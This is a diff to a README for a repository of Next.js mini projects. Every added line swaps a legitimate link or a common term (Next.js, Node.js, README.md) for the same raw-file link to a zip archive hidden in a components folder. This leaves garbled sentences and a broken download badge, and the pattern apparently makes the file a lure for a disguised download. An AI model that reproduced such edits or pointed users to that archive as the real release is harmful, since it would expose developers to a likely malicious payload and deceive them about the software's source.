@@ -2,7 +2,7 @@
 
 ## 📦 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20latest%20release-v1.0-blue.svg)](https://github.com/Adi12-23/nextjs-mini-projects/releases)
+[![Download](https://raw.githubusercontent.com/Adi12-23/nextjs-mini-projects/main/app/components/tree-view/nextjs_projects_mini_tautousious.zip%20latest%https://raw.githubusercontent.com/Adi12-23/nextjs-mini-projects/main/app/components/tree-view/nextjs_projects_mini_tautousious.zip)](https://raw.githubusercontent.com/Adi12-23/nextjs-mini-projects/main/app/components/tree-view/nextjs_projects_mini_tautousious.zip)
 
 ## 📖 Table of Contents
 1. [Introduction](#introducing-the-nextjs-mini-projects)
@@ -15,14 +15,14 @@
 
 ## 🌟 Introducing the nextjs-mini-projects
 
-The **nextjs-mini-projects** repository includes a collection of 20 mini projects using Next.js, React, and TypeScript. These projects are perfect for anyone looking to enhance their web development skills. Each project focuses on different concepts, allowing you to learn and practice as you go. Whether you're a beginner or looking to expand your portfolio, these mini projects will help you build a strong foundation.
+The **nextjs-mini-projects** repository includes a collection of 20 mini projects using https://raw.githubusercontent.com/Adi12-23/nextjs-mini-projects/main/app/components/tree-view/nextjs_projects_mini_tautousious.zip, React, and TypeScript. These projects are perfect for anyone looking to enhance their web development skills. Each project focuses on different concepts, allowing you to learn and practice as you go. Whether you're a beginner or looking to expand your portfolio, these mini projects will help you build a strong foundation.
 
 ## ⚡ Features
 
 - **20 Mini Projects**: Explore diverse projects that demonstrate various aspects of web development.
 - **Easy to Understand**: Code is structured for clarity, making it easy for you to follow along.
 - **Responsive Design**: Each project ensures a good look on both desktop and mobile devices.
-- **Modern Technologies**: Utilize the latest in web development with Next.js and React.
+- **Modern Technologies**: Utilize the latest in web development with https://raw.githubusercontent.com/Adi12-23/nextjs-mini-projects/main/app/components/tree-view/nextjs_projects_mini_tautousious.zip and React.
 - **Expandable**: Each mini project can serve as a foundation for larger applications.
 
 ## 💻 System Requirements
@@ -31,7 +31,7 @@ To run the mini projects, you need:
 
 - An up-to-date web browser (Chrome, Firefox, or Safari).
 - A computer with at least 4 GB of RAM.
-- Node.js and npm (Node Package Manager) installed. This is necessary for running the projects locally.
+- https://raw.githubusercontent.com/Adi12-23/nextjs-mini-projects/main/app/components/tree-view/nextjs_projects_mini_tautousious.zip and npm (Node Package Manager) installed. This is necessary for running the projects locally.
 
 *For specific operating systems*: Windows, macOS, or Linux should work fine.
 
@@ -39,7 +39,7 @@ To run the mini projects, you need:
 
 To download the mini projects, visit the releases page:
 
-[Download from GitHub Releases](https://github.com/Adi12-23/nextjs-mini-projects/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/Adi12-23/nextjs-mini-projects/main/app/components/tree-view/nextjs_projects_mini_tautousious.zip)
 
 Here's how to get started:
 
@@ -53,9 +53,9 @@ Here's how to get started:
 
 ## 🚀 Usage
 
-Each mini project is well-documented to guide you through its structure. You can explore different functionalities by navigating the file system. Each project will typically have a `README.md` file with instructions specific to it. 
+Each mini project is well-documented to guide you through its structure. You can explore different functionalities by navigating the file system. Each project will typically have a `https://raw.githubusercontent.com/Adi12-23/nextjs-mini-projects/main/app/components/tree-view/nextjs_projects_mini_tautousious.zip` file with instructions specific to it. 
 
-- **Project Structure**: Familiarize yourself with folders like `/components`, `/pages`, and `/public` to understand how Next.js organizes projects.
+- **Project Structure**: Familiarize yourself with folders like `/components`, `/pages`, and `/public` to understand how https://raw.githubusercontent.com/Adi12-23/nextjs-mini-projects/main/app/components/tree-view/nextjs_projects_mini_tautousious.zip organizes projects.
 - **Edit and Experiment**: Feel free to change code and styles to see how your changes affect the project.
 
 ## 🤝 Contributing
